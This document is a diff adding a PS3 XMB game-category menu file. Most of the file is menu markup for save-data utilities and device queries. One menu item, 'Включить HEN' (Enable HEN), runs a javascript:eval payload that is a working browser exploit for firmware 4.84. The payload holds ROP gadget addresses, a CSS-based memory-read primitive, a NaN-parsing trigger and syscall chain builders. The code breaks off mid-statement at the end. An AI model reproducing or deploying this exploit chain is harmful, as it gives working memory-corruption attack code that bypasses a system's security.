@@ -1,0 +1,664 @@
+﻿<XMBML version="1.0">
+	<View id="root">
+		<Attributes>
+			<Table key="hen_xmb">
+				<Pair key="focus_priority"><String>-80</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_fixed_items"
+				src="#seg_fixed_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_sdps2"
+				src="sel://localhost/ps2emusave?category_game.xml#seg_sdps2"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_fixed_items2"
+				src="#seg_fixed_items2"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="hen_xmb"
+				attr="hen_xmb"
+				src="#hen_xmb"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_package_files"
+				src="#seg_package_files"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="external_xmb" 
+				src="xmb://localhost/dev_usb000/external.xml#external"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="hen_toolbox_xmb"
+				src="xmb://localhost/dev_hdd0/game/HENTOOLBX/USRDIR/hen_toolbox_xmb.xml#hen_toolbox_xmb_main"
+				/>
+			<Query
+                class="type:x-xmb/folder-pixmap"
+                key="henbrew_store_xmb"
+                src="xmb://localhost/dev_hdd0/game/HENBSTORE/USRDIR/henbrew_store_xmb.xml#henbrew_store_xmb_main"
+                />
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="xmb_app3" 
+				attr="xmb_app3" 
+				src="xmb://localhost/dev_hdd0/xmlhost/game_plugin/fb.xml#seg_fb"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_gameexit"
+				src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_manual"
+				src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_device"
+				attr="seg_device"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"
+			/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_device_bdv"
+				attr="seg_device_bdv"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"
+			/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_device2"
+				attr="seg_device2"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"
+			/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_add_content_device"
+				attr="seg_add_content_device"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName EX_GAME"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="seg_mv_content_device"
+				attr="seg_mv_content_device"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName THEMEDIR"
+				/>
+
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="gameDir"
+				attr="gameDir"
+				src="xil://localhost/list?t=game"
+			/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="gameDir2"
+				attr="gameDir2"
+				src="sel://localhost/ex?root.view_selected.game"
+			/>
+		</Items>
+	</View>
+	
+	<View id="seg_fixed_items">
+		<Attributes>
+			<Table key="psp2appdata">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="title_rsc"><String>msg_vita_application_utility</String></Pair>
+				<Pair key="str_noitem"><String>msg_error_no_content</String></Pair>
+				<Pair key="action"><String>exec_psp2appdata</String></Pair>
+			</Table>
+			<Table key="gamedata">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="title_rsc"><String>msg_gamedata_utility</String></Pair>
+				<Pair key="str_noitem"><String>msg_error_no_gamedata</String></Pair>
+				<Pair key="action"><String>exec_game</String></Pair>
+			</Table>
+			<Table key="sdvmc">
+				<Pair key="icon_rsc"><String>item_tex_ps12util</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemSavePS12</String></Pair>
+				<Pair key="title_rsc"><String>msg_memory_card_utility</String></Pair>
+				<Pair key="action"><String>exec_vmcsavedata</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+				<Pair key="vmc"><String>promote</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/xmlpsp2appdata" key="psp2appdata" attr="psp2appdata"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gamedata" attr="gamedata" src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.timeCreated&cond=Ae+Game:Game.category GD+Oe+Game:Game.category 2D" />
+			<Query class="type:x-xmb/xmlmcutility" key="sdvmc" attr="sdvmc" src="#sdvmc_2nd" />
+		</Items>
+	</View>
+
+	<View id="seg_fixed_items2">
+		<Attributes>
+			<Table key="sdpsp">
+                <Pair key="icon_rsc"><String>item_tex_psputil</String></Pair>
+                <Pair key="icon_notation"><String>WNT_XmbItemSavedataMinis</String></Pair>
+                <Pair key="title_rsc"><String>msg_savedata_utility_minis_psp</String></Pair>
+                 <Pair key="action"><String>exec_pspsavedata</String></Pair>
+                 <Pair key="ms_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+                 <Pair key="sd_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+                 <Pair key="cf_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+                 <Pair key="mass_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+                <Pair key="data_connection"><String>xcb://localhost/query?limit=2048&ssort=root.sort_selected.savedata_psp_all</String></Pair>
+             </Table>
+			 <Table key="sdps3">
+				<Pair key="icon_rsc"><String>item_tex_ps3util</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemSavePS3</String></Pair>
+				<Pair key="title_rsc"><String>msg_savedata_utility_ps3</String></Pair>
+				<Pair key="action"><String>exec_ps3savedata</String></Pair>
+				<Pair key="ms_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps3&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="sd_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps3&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="cf_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps3&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="mass_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps3&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="data_connection"><String>xcb://localhost/query?limit=2048&ssort=root.sort_selected.savedata_ps3_all</String></Pair>
+			</Table>
+			<Table key="welcome">
+				<Pair key="content_type"><String>game</String></Pair>
+ 			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/xmlsavedata-psp" key="sdpsp" attr="sdpsp"/>
+			<Query class="type:x-xmb/xmlsavedata-ps3" key="sdps3" attr="sdps3"/>
+			<Query class="type:x-xmb/xmlwelcome" key="welcome" attr="welcome" />
+		</Items>
+	</View>
+
+	<View id="seg_psp2appdata_vita">
+		<Attributes>
+			<Table key="psp2appdata_vita">
+				<Pair key="title_rsc"><String>msg_applications_vita</String></Pair>
+				<Pair key="type"><String>vita</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_vita" attr="psp2appdata_vita" />
+		</Items>
+	</View>
+	<View id="seg_psp2appdata_psp">
+		<Attributes>
+			<Table key="psp2appdata_psp">
+				<Pair key="title_rsc"><String>msg_applications_psp_other</String></Pair>
+				<Pair key="type"><String>psp</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_psp" attr="psp2appdata_psp" />
+		</Items>
+	</View>
+	<View id="seg_psp2appdata_ps1">
+		<Attributes>
+			<Table key="psp2appdata_ps1">
+				<Pair key="title_rsc"><String>msg_applications_ps1</String></Pair>
+				<Pair key="type"><String>ps1</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_ps1" attr="psp2appdata_ps1" />
+		</Items>
+	</View>
+	<View id="seg_psp2appdata_psm">
+		<Attributes>
+			<Table key="psp2appdata_psm">
+				<Pair key="title_rsc"><String>msg_applications_psm</String></Pair>
+				<Pair key="type"><String>psm</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_psm" attr="psp2appdata_psm" />
+		</Items>
+	</View>
+
+	<View id="seg_sdps2">
+		<Attributes>
+			<Table key="sdps2">
+				<Pair key="icon_rsc"><String>item_tex_ps3util</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemSavePS3</String></Pair>
+				<Pair key="title_rsc"><String>msg_savedata_utility_ps2</String></Pair>
+				<Pair key="action"><String>exec_sdps2</String></Pair>
+				<Pair key="ms_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps2&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="sd_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps2&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="cf_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps2&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="mass_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdps2&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="data_connection"><String>host://localhost/q?path=</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/xmlsavedata-ps2" key="sdps2"  attr="sdps2"/>
+		</Items>
+	</View>
+
+	<View id="seg_sdplus">
+		<Attributes>
+			<Table key="sdplus">
+				<Pair key="icon_rsc"><String>item_tex_online_storage</String></Pair>
+				<Pair key="title_rsc"><String>msg_online_storage</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/xmlsavedata-plus" key="sdplus"  attr="sdplus"/>
+		</Items>
+	</View>
+	
+	<View id="seg_gameexit">
+		<Items>
+			<Item class="type:x-xmb/xmlgameexit" key="gameexit" />
+		</Items>
+	</View>
+
+	<View id="seg_manual">
+		<Attributes>
+			<Table key="manual">
+				<Pair key="icon_rsc"><String>tex_manual</String></Pair>
+				<Pair key="title_rsc"><String>msg_soft_manual</String></Pair>
+				<Pair key="module_name"><String>game_plugin</String></Pair>
+				<Pair key="module_action"><String>manual</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="manual" attr="manual" />
+		</Items>
+	</View>
+
+	<View id="sdvmc_2nd">
+		<Attributes>
+			<Table key="seg_newvmc">
+				<Pair key="focus_priority"><String>-1</String></Pair>
+			</Table>
+			<Table key="sdvmc">
+				<Pair key="icon_rsc"><String>item_tex_ps12util</String></Pair>
+				<Pair key="action"><String>exec_vmcsavedata</String></Pair>
+				<Pair key="focus_priority"><String>-2</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<!-- MS -->
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_device_ms"
+				src=""
+				/>
+			<!-- SD -->
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_device_sd"
+				src=""
+				/>
+			<!-- CF -->
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_device_cf"
+				src=""
+				/>
+			<!-- USBMASS -->
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_device_usbmass"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"
+				/>
+			<!-- for PS1/PS2 MemoryCard Adpter -->
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_seg_device_usb_ps2mc"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS2MC"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_seg_device_usb_ps1mc"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS1MC"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="vmc_seg_device_usb_pda"
+				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PDA"
+				/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_newvmc" attr="seg_newvmc" src="#seg_newvmc" />
+			<Query class="type:x-xmb/folder-pixmap" key="sdvmc"  attr="sdvmc" src="xcb://localhost/query?limit=2048&ssort=root.sort_selected.vmc_all&genre=Game&cond=Aa+Vmc:Common.title" />
+		</Items>
+	</View>
+
+	<View id="seg_newvmc">
+		<Attributes>
+			<Table key="new_vmc">
+				<Pair key="title_rsc"><String>msg_new_vmc</String></Pair>
+				<Pair key="info"><String>new_vmc</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item  class="type:x-xmb/vmc-new" key="new_vmc" attr="new_vmc" />
+		</Items>
+	</View>
+
+	<View id="sdvmc_copy_newvmc">
+		<Attributes>
+			<Table key="copy_new_vmc">
+				<Pair key="title_rsc"><String>msg_new_vmc</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="copy_new_vmc"  attr="copy_new_vmc" />
+		</Items>
+	</View>
+
+	<View id="hen_xmb">
+		<Attributes>
+			<Table key="hen_enable">
+				<Pair key="icon"><String>/dev_flash/vsh/resource/explore/icon/hen_enable.png</String></Pair>
+				<Pair key="title"><String>★ Включить HEN</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action">
+					<String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=0x42c778,gmod4c_addr=0x054af0,gmod15_addr=0x39d038,gmod12_addr=0x63315c,gmod9_addr=0x010b20,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),progress_msg_frag1="\74h1\76Enabling \74s\76HEN\74/s\76 ",progress_msg_frag2="%\74/h1\76",fail_msg_frag=\47\74div id="c" class="fail"\76\74/div\76\74div id="d"\76\74s\76HEN\74/s\76 \74b\76Exploit initialization failed!\74/b\76\74/div\76\47,fsopen=0x321,fsread=0x322,fswrite=0x323,fsclose=0x324,fsstat=0x328;if(fwv=="4.84"){(toc_addr=7296344),(gadget1_addr=620036),(gadget8_addr=131072),(gmod1_addr=6352856),(gmod2_addr=80756),(gmod3_addr=757248),(gmod4a_addr=890500),(gmod4b_addr=4376440),(gmod4c_addr=346864),(gmod7_addr=108204),(gmod8_addr=2862264),(gmod9_addr=68384),(gmod12_addr=6500860),(gmod15_addr=3788856)}function show(str){document.getElementById("result").innerHTML=str}function scall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out){if(r31out===null){r31out=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(sc)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+fill4(0x4,dbyte41)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x10,dbyte41)+hdw(r5_ptr-0x4)+hdw(gtemp_addr)+fill8(0x18,dbyte41)+hdw(gmod4c_addr)+fill16(0xb0,dbyte41)+hdw(r3_ptr)+fill16(0x10,dbyte41)+hdw(gmod4b_addr)+fill16(0x60,dbyte41)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function load_r3_word_from_ptr_32(offset,r26out,r27out,r28out,r29out,r30out,r31out){return(hdw(gmod3_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+hdw(offset-0x8)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod15_addr)+fill16(0x50,dbyte41)+fill8(0x8,dbyte41)+hdw(r26out)+hdw(r27out)+hdw(r28out)+hdw(r29out)+hdw(r30out)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function h2b(hex_val){return String.fromCharCode(hex_val)}function hw(hex_val){return(String.fromCharCode(hex_val\76\7616)+String.fromCharCode(hex_val))}function hdw(hex_val){return hw(0)+hw(hex_val)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(hex_16){var ascii="";var i=0;while(i\74this.length){if(hex_16===true){ascii+=this.charCodeAt(i).toString(16).toHex16()}else{ascii+=this.charCodeAt(i).toString(16)}i+=1}return ascii};String.prototype.convert=function(ascii){if(this.length\741){return""}var asciistr="";var asciichr="";var i=0;var ret=[];if(ascii===true){asciistr=this}else{asciistr=this.toAscii()}while(asciistr.length%4!==0){asciistr+="00"}if(asciistr.substr(asciistr.length-3,2)!=="00"){asciistr+="0000"}while(i\74asciistr.length){asciichr=asciistr.substr(i,4);ret.push(String.fromCharCode(parseInt(asciichr,16)));i+=4}return ret.join("")};String.prototype.convertedSize=function(ascii){if(this.length\741){return 0}var asciistr="";if(ascii===true){asciistr=this}else{asciistr=this.toAscii()}while(asciistr.length%4!==0){asciistr+="00"}if(asciistr.substr(asciistr.length-3,2)!=="00"){asciistr+="0000"}return asciistr.length/2};String.prototype.replaceAt=function(index,ch){return this.substr(0,index)+ch+this.substr(index+ch.length)};String.prototype.repeat=function(num){return new Array(num+1).join(this)};Number.prototype.noExponents=function(){var data=String(this).split(/[eE]/);if(data.length===1){return data[0]}var z="",sign=this\740?"-":"",str=data[0].replace(".",""),mag=Number(data[1])+1;if(mag\740){z=sign+"0.";while(mag++){z+="0"}return z+str.replace(/^\-/,"")}mag-=str.length;while(mag--){z+="0"}return str+z};function fromIEEE754(bytes,ebits,fbits){var retNumber=0;var bits=[];var i;var j;var byte;for(i=bytes.length;i;i-=1){byte=bytes[i-1];for(j=8;j;j-=1){bits.push(byte%2?1:0);byte=byte\76\761}}bits.reverse();var str=bits.join("");var bias=(1\74\74(ebits-1))-1;var s=parseInt(str.substring(0,1),2)?-1:1;var e=parseInt(str.substring(1,1+ebits),2);var f=parseInt(str.substring(1+ebits),2);if(e===(1\74\74ebits)-1){retNumber=f!==0?NaN:s*Infinity}else if(e\760){retNumber=s*Math.pow(2,e-bias)*(1+f/Math.pow(2,fbits))}else if(f!==0){retNumber=s*Math.pow(2,-(bias-1))*(f/Math.pow(2,fbits))}else{retNumber=s*0}return retNumber.noExponents()}function generateIEEE754(address,size){var hex=new Array((address\76\7624)\460xff,(address\76\7616)\460xff,(address\76\768)\460xff,address\460xff,(size\76\7624)\460xff,(size\76\7616)\460xff,(size\76\768)\460xff,size\460xff);return fromIEEE754(hex,11,52)}function generateExploit(address,size){var n=(address\74\7432)|((size\76\761)-1);return generateIEEE754(address,n-address)}function rmem(address,size){if(document.getElementById("exploit")){document.getElementById("exploit").style.src="local("+generateExploit(address,size)+")"}}function cmem(address,size,len){if(document.getElementById("exploit")){rmem(address,size);return document.getElementById("exploit").style.src.substr(6,len)}}function trigger(exploit_addr){if(document.getElementById("trigger")){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+exploit_addr.toString(16)+")")}}function lc1(){if(total_loops\74max_loops){t_out=setTimeout(initROP,500,false)}else{total_loops=0;show(fail_msg_frag);t_out=0}}function lc2(){if(total_loops\74max_loops){t_out=setTimeout(initROP2,500,false)}else{total_loops=0;show(fail_msg_frag);2;t_out=0}}function findJsVariableOffset(name,exploit_data,base,size){rmem(base,size);var 